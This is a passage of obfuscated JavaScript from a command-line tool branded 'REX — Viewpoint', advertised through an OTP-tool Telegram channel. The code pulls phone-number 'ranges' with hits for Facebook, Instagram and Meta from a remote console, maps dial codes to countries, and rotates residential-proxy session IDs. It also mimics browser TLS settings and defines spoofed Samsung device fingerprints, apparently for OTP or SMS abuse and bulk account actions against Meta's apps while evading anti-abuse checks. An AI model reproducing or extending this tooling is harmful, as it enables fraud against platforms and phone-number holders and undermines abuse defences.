'DM5lyq', 'qMPrBa', 'u1nmxW', 'rYbtrq', 'DNnOsq', 'zNvSBa', 'zK5oEG', 'uIbttW', 'CZq6lW', '8j+tMcbgyq', 'wNncuq', 'Evjevq', 'AwnZlG', 'Aw51zq', 'r29juG', 'CNnOzq', 'ANjSAG', 'B2DPyW', 'C1nRrq', 'x2TPBG', 'sg9NrG', 'Dw10sq', 'Chzuua', 'Fcb8lW', 'CLvrta', 'Df9LDG', 'qK9SEq', 'txHXva', 'zuTlzq', 'zMfPBa', 'EgL0Aq', 'wgPzBW', 'ELrMEq', 'iZaWrG', 'vgvSAW', 'ica6ia', 't09KCa', 'thPiAG', 'B2yGDa', 'q3H2va', 'A2T3zG', 'zwnSAq', 'iIbPBG', 's3bkBa', 'B3qGzW', 'z3fKwq', 'mZzqsLvuze4', 'B2SUyW', 'zguUAG', 'ANrYAG', 'B2PMwa', 'l3bSyq', 'mJm2', 'vevXqW', 'wNDPzG', 'CML0', 'BNvTCW', 'r0PtCa', 'mtaGva', 'shzjuq', 'CMvHza', 'BMvLza', 'yMPLyW', 'y29UCW', 'mtG0oq', 'D0vwua', 'x2aGFa', 'oty4', 'wu9VyG', 'BMDFAq', 'BgvNCG', 'ChjPBG', 'if8Gia', 'ignSzq', 'nJC4', 'EhnfBq', 'sLjhyW', 'AYWKBq', 'BMvFBG', 'reHLCq', 'Eezura', 'ihzHBa', 'D1jTyq', 'D3fTEa', 'tuTxqG', 'qxnNta', 'DhrJqG', 'Auzjuq', 'v2XLza', 'B25SEq', 'Awq9', 'oIboBW', 'AKfPEa', 'svDWta', 'zsaODa', 'l3nJCG', 'FcbLyW', 'BK5jzW', 'oti4qG', 'ufDXta', 'vLDvyW', 'rgLzuG', 'zgvMBa', 'zvLICW', 'zM9yqG', 'uKfjza', 'wwvZla', 'jMfJDa', 'zNHyzW', 'igfKza', 'Agv4', 'ywnL', 'BYbUDq', 'o0zcra', 'uwvcuW', 'z0rmqG', 'vNzpsG', 'DfPeqW', 'u1rfuG', 'uwjtDq', 'rvmXmG', 'sfjfqq', 'EK96Bq', 'ENjKEG', 'jg1Nia', 'DvfQta', 'jNn0yq', 'ntm2rq', 'Dg8G', 'z3HYEa', 'x3rVxW', 'tNvdrW', 'B2nLzq', 'DgHLCG', 'AKvdtW', 'AgDgza', '4QYf77IpiejH', 'zLbpsa', '4PYtiezV', 'uKvhsq', 'sNfvyW', 'yxrO', 'tgjwuG', 'C3nFDa', 'zvnkyq', 'EeTAEa', 'yKjdwG', 'thyZ', 'ic5FxW', 'tunbEa', 'kYKRja', 'B3rWCW', 'tgvUzW', 'mtTD', 'j0Hlta', 'psaOrW', 'wNvWtq', 'zxjZia', 'AMXTBW', 'mJq0', 'qMXusa', 'AhDPza', 'kev4Da', 'BgLUzq', 'BwjLCG', 'tKHMzq', 'ugPUta', 's3b5DW', 'rfvvvG', 'C3mVqa', 'AMDbva', 'rffHvG', 'zNjVBq', 'rxP0AW', '8j+tUeLhka', 'zw5KCW', 'zMLNDq', 'uLjTuq', 'oty0', 't2zHwq', 'r0nfsa', 'BMvK', '4PYxievY', 'z3jLzq', 'zNvRyW', 'C1fHAG', 'tezuEa', 'y29WEq', 'mJy2', 'yIKGlq', 'qM5TEG', 'CNr5ia', 'revRAG', 'AKXUyW', 'wvnjva', 'uNzdBG', 'q1qGtG', 'khnJyq', 'thzKsW', 'cUkCLYbb', 'wgTbsW', 'DgHLia', 'BIbVCG', 'EsbYyq', 'l2fWAq', 'mg0k', 'C19SBW', 'rLPdDq', 'nty6va', 'mtq3ma', 'cIaG4PYt', 'mdaX', 'z2LZDa', 'zMjFzG', 'BMXVyq', '8j+tGsbmBW', 'BhvYzq', 'D1nnAq', 'vxPVDa', 'r0nozW', 'vxbSBW', 'zxiGjW', 'FhzPzq', 'zhvKDq', 'rKjcvG', 'oLaTmW', 'AgvHza', 'icdINjmG', 'C0XVzW', 'Awz5', 'CNjVCG', 'BK1nBa', 'BMfTzq', 'z2zgrG', 'B3iGDa', 'uvDbsG', 'mJm1', 'Bg96zG', 'Bg1XAW', 'zeDRDW', 'rK9fuW', 'B3v0', 'Du9PBa', 'zujVyq', 'ieHPDa', 'tM8GAa', 'twLzDG', 'Cg9W', 'vuDyyG', 'sxjIAa', 'ieXVyq', 'D3zSDW', 'wfzhBG', 'Aw5Nia', 't1fIyW', 'u0Hfra', 'BL9HyW', 'zxiGmW', 'wujSEq', 'rgvywa', 'DgvYzG', 'yw5KCG', 'rwvrqG', 'runptG', 'BxrozW', 'v29WtW', 'tMv4yq', 'BwuVCW', 'CKT2ua', 'DxrSwq', 'zxnZzG', 'u0eTqq', 'AxnFBG', 'zsboBW', 'Aw5NCW', 'B29RlG', 'zwzRra', 'CMHurW', 'D1jArq', 'BwfPBG', 'luHosq', 'seuTuG', 'CKX0vq', 'DhbZlq', 'vgDkBq', 'A1nuyW', 'ChvIBa', 'wNnhCq', 'vhDsCG', 'ELfMra', 'BMLkCq', 'mJC7rG', 'Aw1PqW', 'oNbHCW', 'txH3rW', 'CMLJzq', 'DKzODa', 'y3rLza', 'sxzREq', 'whHWCq', 'qundrq', 'zgvuuq', 'y2vFAq', 'Fdr8nG', 'Ag9ZDa', 'BvfiDG', 'ue9mwq', 'C29SDq', 'q2rKBa', 'suTbsq', 'y0LpEG', 'BgzNEG', 'tgTwuW', 'vgzdAa', 'i0zdqq', 'qYblrq', 'BMfS', 'vwPMuG', 'rcbPBG', 'zw5FBG', 'mdaWma', 'r1jLza', 'zMXvvG', 'CxznAq', 'jNbOBW', 'ntKY', 'i0zgnG', 'CgLWzq', 'CZu6lW', 'twzdCq', 'ruz2zW', 'lsb1CW', 'uMXRzG', 'rwnzqq', 'Ag9Tzq', 'nIu3qW', 'EwTOvq', 'DfXdCG', 'AK9iBq', 'DMfPBa', 'shr2vq', 'EcdIMQe', 'z3Horq', '8j+tSsbttq', 'y1ferG', 'tNf4tq', 'sw5ZDq', 'igfNyq', 'zxqTqW', 'q29UBG', 'y2XbDG', 'Bxzruq', 'Dg9fEa', 'zxnLCG', 'uMvZCa', 'D2XSBa', 'BgqV', 'tuyV', 'zs5NlG', 'rNPjyW', 'rfP1Dq', 'g1SWBq', 'zg93BG', 'xsbuCG', 'BMDfDW', 'zu1gAW', 'q0LnEG', 'EKfzrW', 'zKTpAW', 'nJi2mdaWweDYAvnP', 'uhjLBq', 'EgvUva', 'Aw9lyW', 'vvHwwa', 'g1SZsG', 'zffuzG', 'rgLYzq', 'igHPDa', 'v2HiBW', 'Bw5J', 'EMvAwq', 'uKz1ta', 'C1DkEa', 'Fdb8oq', 'y21Ysa', 'DMLmuq', 'CM1HDa', 'uMLItq', 'ntKX', 'A1rqqG', 'AcbKAq', 'iZG4oa', '4Pwq4Pwq4Pwq4PwJ', 'B3vUDa', 'A3fuAG', 'pufojq', 'zhmGka', 'ufzKsW', 'CfHqAa', 'zxHwvG', 'uu56AG', 'Dc4UlG', 'tLqGia', 't1nwsq', 'B3nyAG', 'x19Fia', 'x3zWxW', 'Ag9Uzq', 'zxjZlW', 'wLPMza', 'lurLDG', 'ywrKta', 'CgKPoG', 'BNnKAa', 'y3PyzW', 'otm2qG', 'ws0Tlq', 'Aw5NxW', 'u0SG4Ocu', 'u00TrG', 'CgrVzq', 'otC0', 'BL9JBa', 'BM9sqq', 'DxrMoa', 'CxvLDq', 'ywXRqa', 'BMTirG', 'wgv2wa', 'su9AuG', 'ntK4', 'tJbzBq', 'v1bpsq', 'yMvYCW', 'zLPPAG', 'tMXpsG', 'v29YAW', 'verTEG', 'reLsrq', 'wK1yEq', 'lIbqBa', 'mJyY', 'vwLIBq', 'z2HqwG', 'BhzL', 'BMvgqq', 'vMDoBa', 'EuHMsW', 'AwnLlq', 'D3fxza', 'mJq5', 'zwqGCW', 'q3fXAW', 'BMLUzW', 'BgWGFa', 'tu5jrq', 'x3XCxW', 'CM9Wia', 'Dg8GzW', 'qvbjia', 'zMi4za', 'zeX1uq', 'ihT9', 'z2uOCW', 'r1Llyq', 'rxjYBW', 'r0DfuG', 'tuv4sW', 'ywDYyq', 'zxqGyW', 'BMLPsa', 'AwnHDa', 'B2XhDa', 'yw5Jzq', 'uxH0Ca', 'vu9tAG', 'v3jPDa', 'l2v0yW', 'vw5RBG', 'rNHVuG', 'Bhf4Ca', 'y2HHBa', 'ugPrDa', 'tMjmuq', 'ywfqEG', 'A0D0za', 'uKrXzG', 'CfzdAa', 'zev6Aq', 'ksbBrG', 'mJm3', 'BwfWAq', 'mtq2ua', 'yLjYAG', 'C29Yia', 'C0rWva', 'xsbwzq', 'D2XJyW', 'zwncqG', 'sLHKvW', 'sejTAq', 'mJi3', 'r3nVwa', 'y3rYBa', 'zNrPyW', 've1Suq', 'yxzLza', 'wM1fuG', 'mJi4', 'vMLjzW', 'CYbRzq', 'Cw5Pqq', 's3z3sW', 'rw9hCa', 'mc4WlG', 'vujjDW', 'DwzOva', 'AxjLza', 'quLuxW', 'yw0Gia', 'mJi5', 'EMXPyG', 'DgvY', 'AMrVrG', 'BgqGBG', 'u1nFtG', 'q1HqrW', 'qKjYta', 'ihnLCG', 'odqXoa', 's0nAza', 'C2f1sW', '4OYO77Ipien1', 'A2LSBa', 'DMTMvW', 'mJu4', '4P6ug1SZ', 'BMfPDW', 'sM9uBa', 'z3jHCa', 'mti4xW', 'wfv2qW', 'zf9Syq', 'DKrezG', 'tfP1qW', 'Aw9UlW', 'rNbOqq', 'CguGjW', 'rxjYoG', 'Cfrqta', 'AxDctW', 'C09Ksq', 'tvfjua', 'v2jotG', 'EevVAG', 'zcbZzq', 'twrkuG', 'BMTtEq', 'rePMDW', 'qxLZsq', 'zLDSuG', 'zwn0zq', 'AKTzsG', 'wMvUzq', 'ww5fBG', 'tvLxra', 'sLPIyq', 'ywqGzG', 'tKTYsG', 'CYbHBG', 'icH0Eq', 'zxrLyW', 'C2v0uG', 'zsKUtq', 'x18GxW', 'y2XVCW', 'C29UjG', 'icaVia', 'jgnWDq', 'Dgf0Dq', 'tNjlvq', 'yNmVAa', 'icHmAq', 'sergzq', 'AhPZCW', 'ihnHDG', 'suDUsa', 'lJeUma', 'CeP1sa', 'w0vsuG', 'igLUDG', 'FdD8mq', 'BxPqzG', 'CM0TDq', 'ug50rG', 'Dw5Kia', 'zgfqta', 'uwHNCa', 'zxnZyq', 'sLvwva', 'ignOzq', 'x198xW', 'Aw5PDa', 'rMLSzq', 'zY4k', 'EuDcDa', 'CL9HyW', 'mtmWnq', 'u1njtW', 'otKZ', 'yujLzW', 'ywX0Aa', 'ChjXCq', 'xYWGFa', 'ALbHDW', 'wK5XDW', 'mJuZ', 'BhLdBW', 'v0LKAa', 'luffuW', 'Dvz2Eq', 'z3PPCa', 'icaJia', 'CgfYCW', 'qvqMva', 'zM9YBq', 'DKvSqq', 'qvzHtG', 'uKHWua', 'Bwr1uW', 'x19Jyq', 'BM5Lza', 'AfvkyG', 'wtHwqq', 'Awq7ia', '4PQHifPL', 'ANfuDG', 'sg93ia', 'v2PXtG', 'EKr2rq', 'ig9Yia', 'yuzQtq', 'tvLRrq', 'BK1osa', 'mZyZmJaZt2LgCKfq', 'C2uGAq', 'zsb8ia', 'zuzPBa', 'CNzjwG', 'CM9NCG', 'BNDYyq', 'z2vY', 'Dg8GCG', 'rvj1Ea', 'tgLJzq', 'AMDLsq', 'ic8GxW', 'uKrxqq', 'vvritW', 'mM0G', 'EK1rzW', 'su4Gua', 'ExbLia', 'rezbuG', 'xsbiva', 'iokUNIbB', 'mJuX', 'zwqUDa', 'rgfbta', 'ndG1wa', 'vNzSua', 've1iCq', 'B2nLCW', 'yxjNDG', 'BcbKzq', 'vfeZqq', 'kcGOlG', 'zgvZDa', 'BYbsyq', 'vxDLrW', 'sg9dqW', 'qKzLtq', 'DhK9', 'ExPerq', 'DwX0kq', 'ugf0Aa', 'D2vYqW', 'C2fNzq', 'B2fcvW', 's3vRyq', 'mda0', 'Dg90yq', 'Ac52Aq', 'BMvewG', 'otaW', 'Aw5WDq', 'icaGxW', 'khj1BG', 'r2v0lq', 'mtaWia', 'uezuCq', 'BNnVBa', 't2zHra', 'zMvMqq', '4Pwq4Pwq4Pwq4PwD', 'q2zzDa', 'DgvJDa', 'DwzbBW', 'zY4UlG', 'BMCGBa', 'x2LK', 'BenVDq', 'CeDXsa', 'AMXXuq', 'wuvZDG', 'oc1hqW', 'u00TrW', 'EuHOAq', 'ks5tzq', 'rNDewa', 're12uq', 'vNHhDa', 'A3PNDG', 'EhzZEa', 'rhjVCa', 'igfUza', 'EfbosW', 'zsbqyq', 'zw91Da', 'ls0ktq', 'C3rHCG', 'g1Ti', 'u1aXqq', 'C2HPzG', '4PYp77Ipicbf', 'mZeW', 'twrWvG', 'mJu0', 'u21ZqG', 'o0zcqW', 'qNbowa', 'r2vOBG', 'yK9itW', 'uKLArq', 'zcbYyq', 'BNHmBa', 'v29QzG', 's1rKta', 'qw5HBa', 'DNrZra', 'Aw5NlG', 'B3bZuq', 'rKDUrW', 'jM1LCW'];
  fn1 = function () {
    return v100;
  };
  return fn1();
}
function twoOoFetchConsole(v101, v102) {
  return new Promise((v103, v104) => {
    {
      const v105 = {};
      v105.mauthapi = v101;
      const v106 = {};
      v106.hostname = TWOOO_HOST, v106.port = 0x1bb, v106.path = v102, v106.method = "GET", v106.headers = v105;
      const v107 = v106,
        v108 = https.request(v107, v109 => {
          {
            let v110 = '';
            v109.on("data", v111 => v110 += v111), v109.on("end", () => {
              try {
                {
                  const v112 = JSON.parse(v110);
                  if (v112?.["meta"]?.["code"] === 200 && Array.isArray(v112?.["data"]?.["hits"])) v103(v112.data.hits);else v104(new Error(v112?.["message"] || "Console fetch failed"));
                }
              } catch (v113) {
                v104(new Error("Console: Invalid JSON"));
              }
            });
          }
        });
      v108.on("error", v114 => v104(new Error("Console network: " + v114.message))), v108.setTimeout(10000, () => {
        v108.destroy(), v104(new Error("Console timeout"));
      }), v108.end();
    }
  });
}
function parseTwoOoRangeSelection(v115, v116) {
  const v117 = new Set();
  const v118 = v115.split(/[\s,]+/).filter(v119 => v119);
  for (const v120 of v118) {
    {
      const v121 = v120.match(/^(\d+)-(\d+)$/);
      if (v121) {
        for (let v122 = +v121[1]; v122 <= +v121[2]; v122++) {
          if (v122 >= 1 && v122 <= v116) v117.add(v122 - 1);
        }
      } else {
        {
          const v123 = parseInt(v120);
          if (!isNaN(v123) && v123 >= 1 && v123 <= v116) v117.add(v123 - 1);
        }
      }
    }
  }
  return [...v117].sort((v124, v125) => v124 - v125);
}
async function autoRangeFinderFor2Oo(v126, v127, v128, v129) {
  const v130 = {};
  v130.facebook = ["facebook", 'fb'], v130.instagram = ["instagram", 'ig'];
  v130.meta = ["meta"];
  v130.all = ["facebook", 'fb', "instagram", 'ig', "meta"];
  const v131 = v130,
    v132 = {};
  v132.facebook = "📘 Facebook", v132.instagram = "📸 Instagram", v132.meta = "🌐 Meta", v132.all = "📦 All (FB+IG+Meta)";
  const v133 = v132;
  console.log(chalk.gray("\n  [Range Finder] Fetching live console feed..."));
  let v134 = [];
  try {
    v134 = await twoOoFetchConsole(v126, v127);
  } catch (v143) {
    return console.log(chalk.red("\n  ✗ Console fetch failed: " + v143.message + '\x0a')), null;
  }
  const v135 = v134.slice(0, 100);
  if (v135.length === 0) return console.log(chalk.red("\n  ✗ No hits in console feed.\n")), null;
  const v136 = await v128("Filter by app:", [{
    'name': "📘 Facebook",
    'value': "facebook"
  }, {
    'name': "📸 Instagram",
    'value': "instagram"
  }, {
    'name': "🌐 Meta",
    'value': "meta"
  }, {
    'name': "📦 All (FB+IG+Meta)",
    'value': "all"
  }]);
  const v137 = v131[v136],
    v138 = v135.filter(v144 => {
      {
        const v145 = (v144.sid || '').toLowerCase(),
          v146 = (v144.message || '').toLowerCase();
        return v137.some(v147 => v145.includes(v147) || v146.includes(v147));
      }
    });
  if (v138.length === 0) {
    return console.log(chalk.red("\n  ✗ No hits for selected app.\n")), null;
  }
  const v139 = {},
    v140 = {};
  for (const v148 of v138) {
    const v149 = v148.range || '';
    if (!v149) continue;
    v139[v149] = (v139[v149] || 0) + 1;
    const v150 = {};
    v150.facebook = 0x0, v150.instagram = 0x0, v150.meta = 0x0, v140[v149] = v140[v149] || v150;
    if (v131.facebook.some(v151 => (v148.sid || '').toLowerCase().includes(v151) || (v148.message || '').toLowerCase().includes(v151))) v140[v149].facebook++;
    if (v131.instagram.some(v152 => (v148.sid || '').toLowerCase().includes(v152) || (v148.message || '').toLowerCase().includes(v152))) v140[v149].instagram++;
    if (v131.meta.some(v153 => (v148.sid || '').toLowerCase().includes(v153) || (v148.message || '').toLowerCase().includes(v153))) v140[v149].meta++;
  }
  const v141 = Object.entries(v139).sort((v154, v155) => v155[1] - v154[1]).slice(0, 5);
  if (v141.length === 0) {
    return console.log(chalk.red("\n  ✗ No valid ranges.\n")), null;
  }
  const v142 = await v128("Range Finder mode:", [{
    'name': "⚡ Auto detect & send (#1 range)",
    'value': "auto"
  }, {
    'name': "📊 Show top 5 & select",
    'value': "select"
  }]);
  if (v142 === "auto") {
    {
      const [v156, v157] = v141[0],
        v158 = v140[v156] || {},
        v159 = [];
      if (v158.facebook) v159.push("📘FB(" + v158.facebook + ')');
      if (v158.instagram) v159.push("📸IG(" + v158.instagram + ')');
      if (v158.meta) v159.push("🌐Meta(" + v158.meta + ')');
      return console.log(chalk.green("\n  ✓ Auto Range: " + v156 + "  (" + v157 + " hits)  " + v159.join('\x20') + '\x0a')), [v156];
    }
  } else {
    {
      console.log(chalk.cyan("\n  App: " + v133[v136] + "  |  Scanned: " + v138.length + " hits\n")), console.log(chalk.yellow("  #   Range              Hits  Apps")), console.log(chalk.gray("  ─".repeat(22))), v141.forEach(([v163, v164], v165) => {
        const v166 = v140[v163] || {};
        const v167 = [];
        if (v166.facebook) v167.push("📘FB(" + v166.facebook + ')');
        if (v166.instagram) v167.push("📸IG(" + v166.instagram + ')');
        if (v166.meta) v167.push("🌐Meta(" + v166.meta + ')');
        console.log(chalk.cyan('\x20\x20' + String(v165 + 1).padEnd(3) + '\x20') + chalk.green(v163.padEnd(16)) + chalk.yellow(String(v164).padEnd(5)) + chalk.gray('█'.repeat(Math.min(v164, 12)) + '\x20\x20') + (v167.join('\x20') || chalk.gray('?')));
      }), console.log(chalk.gray("\n  Enter selection (e.g. 1,3 | 1 2 5 | 1-3)\n"));
      const v160 = await v129("Select ranges:", ''),
        v161 = parseTwoOoRangeSelection(v160, v141.length);
      if (v161.length === 0) {
        return console.log(chalk.red("\n  ✗ No valid selection.\n")), null;
      }
      const v162 = v161.map(v168 => v141[v168][0]);
      return console.log(chalk.green("\n  ✓ Selected: " + v162.join(',\x20') + '\x0a')), v162;
    }
  }
}
let globalHwid = "Unregistered";
function printHeader() {
  {
    process.stdout.write("[2J[3J[H");
    console.log(C("   ____                                      _  ___              "));
    console.log(C("  / ___|  ___ _ __ __ _ _ __   ___ _ __     | |/ (_)_ __   __ _  "));
    console.log(C("  \\___ \\ / __| '__/ _` | '_ \\ / _ \\ '__|    | ' <| | '_ \\ / _` | "));
    console.log(C("   ___) | (__| | | (_| | |_) |  __/ |       | . \\| | | | | (_| | "));
    console.log(C("  |____/ \\___|_|  \\__,_| .__/ \\___|_|       |_|\\_\\_|_| |_|\\__, | "));
    console.log(C("                       |_|                                |___/  \n"));
    console.log(W("┌──────────────────────────────────────────────┐"));
    console.log(W("│ [•] Tool      : ") + C("REX — Viewpoint              ") + W('│'));
    console.log(W("│ [•] Telegram  : ") + C("t.me/Rex_OTP_Tool            ") + W('│'));
    console.log(W("│ [•] Status    : ") + G("Premium Build                ") + W('│'));
    console.log(W("│ [•] Version   : ") + Y("VP-V2.0.2                    ") + W('│'));
    globalHwid !== "Unregistered" && console.log(W("│ [•] HWID      : ") + Y(globalHwid.padEnd(27)) + W('│'));
    console.log(W("└──────────────────────────────────────────────┘\n"));
  }
}
const uuid = () => crypto.randomUUID();
function normalizePhoneNumber(v169) {
  let v170 = v169.replace(/\D/g, '');
  if (!v170.startsWith('+')) {
    v170 = '+' + v170;
  }
  return v170;
}
const DIAL_MAP = [["1868", 'TT'], ["1876", 'JM'], ["1809", 'DO'], ["1829", 'DO'], ["1849", 'DO'], ["880", 'BD'], ["855", 'KH'], ["856", 'LA'], ["228", 'TG'], ["229", 'BJ'], ["233", 'GH'], ["234", 'NG'], ["237", 'CM'], ["243", 'CD'], ["254", 'KE'], ["255", 'TZ'], ["256", 'UG'], ["260", 'ZM'], ["263", 'ZW'], ["212", 'MA'], ["213", 'DZ'], ["216", 'TN'], ["218", 'LY'], ["220", 'GM'], ["221", 'SN'], ["222", 'MR'], ["223", 'ML'], ["224", 'GN'], ["225", 'CI'], ["226", 'BF'], ["227", 'NE'], ["230", 'MU'], ["231", 'LR'], ["232", 'SL'], ["235", 'TD'], ["236", 'CF'], ["238", 'CV'], ["239", 'ST'], ["240", 'GQ'], ["241", 'GA'], ["242", 'CG'], ["244", 'AO'], ["245", 'GW'], ["246", 'IO'], ["247", 'AC'], ["248", 'SC'], ["249", 'SD'], ["250", 'RW'], ["251", 'ET'], ["252", 'SO'], ["253", 'DJ'], ["257", 'BI'], ["258", 'MZ'], ["261", 'MG'], ["262", 'RE'], ["264", 'NA'], ["265", 'MW'], ["266", 'LS'], ["267", 'BW'], ["268", 'SZ'], ["269", 'KM'], ["966", 'SA'], ["971", 'AE'], ["973", 'BH'], ["974", 'QA'], ["968", 'OM'], ["965", 'KW'], ["964", 'IQ'], ["963", 'SY'], ["962", 'JO'], ["961", 'LB'], ["967", 'YE'], ["970", 'PS'], ["972", 'IL'], ["992", 'TJ'], ["993", 'TM'], ["994", 'AZ'], ["995", 'GE'], ["996", 'KG'], ["998", 'UZ'], ["977", 'NP'], ["975", 'BT'], ["959", 'MM'], ["670", 'TL'], ["673", 'BN'], ["676", 'TO'], ["677", 'SB'], ["678", 'VU'], ["679", 'FJ'], ["680", 'PW'], ["591", 'BO'], ["592", 'GY'], ["593", 'EC'], ["594", 'GF'], ["595", 'PY'], ["596", 'MQ'], ["597", 'SR'], ["598", 'UY'], ["380", 'UA'], ["375", 'BY'], ['20', 'EG'], ['27', 'ZA'], ['30', 'GR'], ['31', 'NL'], ['32', 'BE'], ['33', 'FR'], ['34', 'ES'], ['36', 'HU'], ['39', 'IT'], ['40', 'RO'], ['41', 'CH'], ['43', 'AT'], ['44', 'GB'], ['45', 'DK'], ['46', 'SE'], ['47', 'NO'], ['48', 'PL'], ['49', 'DE'], ['51', 'PE'], ['52', 'MX'], ['53', 'CU'], ['54', 'AR'], ['55', 'BR'], ['56', 'CL'], ['57', 'CO'], ['58', 'VE'], ['60', 'MY'], ['61', 'AU'], ['62', 'ID'], ['63', 'PH'], ['64', 'NZ'], ['65', 'SG'], ['66', 'TH'], ['81', 'JP'], ['82', 'KR'], ['84', 'VN'], ['86', 'CN'], ['90', 'TR'], ['91', 'IN'], ['92', 'PK'], ['93', 'AF'], ['94', 'LK'], ['95', 'MM'], ['98', 'IR'], ['58', 'VE'], ['1', 'US'], ['7', 'RU']];
function extractPhoneParts(v171) {
  let v172 = '+1',
    v173 = v171;
  for (const [v175, v176] of DIAL_MAP) {
    {
      if (v171.startsWith(v175)) {
        v172 = '+' + v175, v173 = v171.substring(v175.length);
        break;
      }
    }
  }
  const v174 = {};
  return v174.cCode = v172, v174.lNumber = v173, v174;
}
function parseProxy(v177) {
  if (!v177) return null;
  if (typeof v177 === "object") return v177;
  v177 = v177.trim();
  if (!v177) return null;
  let v178,
    v179,
    v180,
    v181,
    v182 = "http";
  if (v177.startsWith("socks5://")) v182 = "socks5", v177 = v177.slice(9);else {
    if (v177.startsWith("socks4://")) v182 = "socks4", v177 = v177.slice(9);else {
      if (v177.startsWith("http://")) v182 = "http", v177 = v177.slice(7);else v177.startsWith("https://") && (v182 = "http", v177 = v177.slice(8));
    }
  }
  if (v177.includes('@')) {
    const v184 = v177.split('@'),
      v185 = v184[0].split(':'),
      v186 = v184[1].split(':');
    v180 = v185[0], v181 = v185[1], v178 = v186[0], v179 = parseInt(v186[1]);
  } else {
    const v187 = v177.split(':');
    if (v187.length === 2) {
      v178 = v187[0], v179 = parseInt(v187[1]);
    } else {
      if (v187.length === 4) {
        if (!isNaN(parseInt(v187[3])) && isNaN(parseInt(v187[1]))) {
          v180 = v187[0], v181 = v187[1], v178 = v187[2], v179 = parseInt(v187[3]);
        } else v178 = v187[0], v179 = parseInt(v187[1]), v180 = v187[2], v181 = v187[3];
      } else v187.length === 3 && (v178 = v187[0], v179 = parseInt(v187[1]), v180 = v187[2]);
    }
  }
  if (!v178 || !v179) return null;
  const v183 = {};
  v183.type = v182, v183.host = v178, v183.port = v179;
  v183.user = v180, v183.pass = v181;
  return v183.original = v177, v183;
}
function rotateSessionId(v188) {
  if (!v188 || !v188.user) return v188;
  const v189 = {
    ...v188
  };
  const v190 = v189,
    v191 = [/-ssid-[A-Za-z0-9_]+/, /-session-[A-Za-z0-9_]+/, /_session_[A-Za-z0-9_]+/, /-sess-[A-Za-z0-9_]+/];
  for (const v192 of v191) {
    {
      if (v190.user && v192.test(v190.user)) {
        {
          const v193 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
          v190.user = v190.user.replace(v192, '' + v192.source.split('[')[0].replace(/\\/g, '') + v193);
          break;
        }
      }
      if (v190.pass && v192.test(v190.pass)) {
        {
          const v194 = crypto.randomBytes(6).toString("base64").replace(/[+/=]/g, '').substring(0, 10);
          v190.pass = v190.pass.replace(v192, '' + v192.source.split('[')[0].replace(/\\/g, '') + v194);
          break;
        }
      }
    }
  }
  return v190;
}
function createProxyAgent(v195) {
  if (!v195) return null;
  let v196 = '';
  return v195.type === "socks5" || v195.type === "socks4" ? (v196 = "socks5://" + (v195.user ? encodeURIComponent(v195.user) + ':' + encodeURIComponent(v195.pass || '') + '@' : '') + v195.host + ':' + v195.port, new SocksProxyAgent(v196)) : (v196 = "http://" + (v195.user ? encodeURIComponent(v195.user) + ':' + encodeURIComponent(v195.pass || '') + '@' : '') + v195.host + ':' + v195.port, new HttpsProxyAgent(v196));
}
function sendRequest(v197, v198, v199, v200, v201 = null, v202 = 15000, v203 = false) {
  return new Promise((v204, v205) => {
    {
      const v206 = new URL(v197),
        v207 = {
          ...v199
        };
      let v208 = v207,
        v209 = v200 ? Buffer.from(v200) : null;
      if (v203 && v209) try {
        v209 = zlib.gzipSync(v209), v208["content-encoding"] = "gzip";
      } catch (v214) {}
      if (v209) {
        v208["Content-Length"] = v209.length;
      }
      const v210 = {
        'hostname': v206.hostname,
        'path': v206.pathname + v206.search,
        'method': v198,
        'headers': v208,
        'timeout': v202,
        'ciphers': "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
        'ecdhCurve': "X25519:P-256:P-384",
        'honorCipherOrder': false,
        'secureOptions': require("crypto").constants.SSL_OP_NO_SSLv3 | require("crypto").constants.SSL_OP_NO_TLSv1 | require("crypto").constants.SSL_OP_NO_TLSv1_1,
        'minVersion': "TLSv1.2"
      };
      let v211 = v201 ? parseProxy(v201) : null;
      if (v201) {
        {
          if (!v211 || isNaN(v211.port) || v211.port <= 0) return v205(new Error("Invalid proxy"));
          v210.agent = createProxyAgent(v211);
        }
      }
      const v212 = setTimeout(() => {
          v205(new Error("timeout"));
        }, v202),
        v213 = https.request(v210, v215 => {
          clearTimeout(v212);
          const v216 = [];
          v215.on("data", v217 => v216.push(v217));
          v215.on("error", v205), v215.on("end", () => {
            let v218 = Buffer.concat(v216);
            const v219 = v215.headers["content-encoding"];
            if (v219 === "gzip") try {
              v218 = zlib.gunzipSync(v218);
            } catch (v220) {} else {
              if (v219 === "deflate") try {
                v218 = zlib.inflateSync(v218);
              } catch (v221) {}
            }
            v204({
              'status': v215.statusCode,
              'data': v218.toString("utf8"),
              'headers': v215.headers
            });
          });
        });
      v213.on("error", v222 => {
        clearTimeout(v212);
        v205(v222);
      }), v213.on("timeout", () => {
        clearTimeout(v212), v213.destroy(), v205(new Error("timeout"));
      });
      if (v209) v213.write(v209);
      v213.end();
    }
  });
}
const v1 = {};
v1.model = "SM-A536E", v1.brand = "Samsung", v1.build = "SP1A.210812.016", v1.density = 0x2, v1.width = 0x438, v1.height = 0x960, v1.os = '12', v1.arch = "arm64-v8a";
const v2 = {};
v2.model = "SM-G998B", v2.brand = "Samsung", v2.build = "TP1A.220624.014", v2.density = 0x3, v2.width = 0x5a0, v2.height = 0xc80, v2.os = '13', v2.arch = "arm64-v8a";
const v3 = {};
v3.model = "SM-S908E", v3.brand = "Samsung", v3.build = "TP1A.220624.014", v3.density = 0x3, v3.width = 0x5a0, v3.height = 0xc10;
v3.os = '13', v3.arch = "arm64-v8a";
const v4 = {};
v4.model = "SM-S928B", v4.brand = "Samsung", v4.build = "UP1A.231005.007", v4.density = 0x3, v4.width = 0x5a0, v4.height = 0xc30, v4.os = '14', v4.arch = "arm64-v8a";
const v5 = {};
v5.model = "SM-A146P", v5.brand = "Samsung", v5.build = "TP1A.220624.014", v5.density = 0x2, v5.width = 0x438, v5.height = 0x968, v5.os = '13', v5.arch = "arm64-v8a";
const v6 = {};
v6.model = "SM-A256E", v6.brand = "Samsung", v6.build = "UP1A.231005.007", v6.density = 0x2, v6.width = 0x438, v6.height = 0x924, v6.os = '14', v6.arch = "arm64-v8a";
const v7 = {};
